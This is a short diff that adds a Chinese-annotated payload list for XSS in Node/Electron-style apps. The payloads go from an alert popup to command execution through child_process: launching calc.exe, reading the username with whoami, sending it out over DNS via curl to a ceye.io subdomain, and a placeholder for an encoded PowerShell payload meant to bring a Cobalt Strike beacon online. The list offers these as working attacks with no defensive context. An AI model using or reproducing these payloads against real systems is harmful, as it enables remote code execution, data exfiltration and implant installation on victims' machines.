@@ -1,0 +1,9 @@
+xss弹窗<img src=1 onerror=alert("1")>
+
+xss弹计算器<img src=# onerror="require('child_process').exec('calc.exe',null);">
+
+弹用户名<img src=x onerror="const exec = require('child_process').exec;exec('whoami').stdout.on('data', function (data) {alert(data);})">
+
+DNS带外<img src=x onerror="const exec = require('child_process').exec;exec('curl `whoami`.domain.ceye.io').stdout.on('data', function (data) {alert(data);})">
+
+通过对powershell进行编码，然后替换payload上线cs<img src=x onerror="const exec = require('child_process').exec;exec('powershell（……）').stdout.on('data', function (data) {alert(data);})">
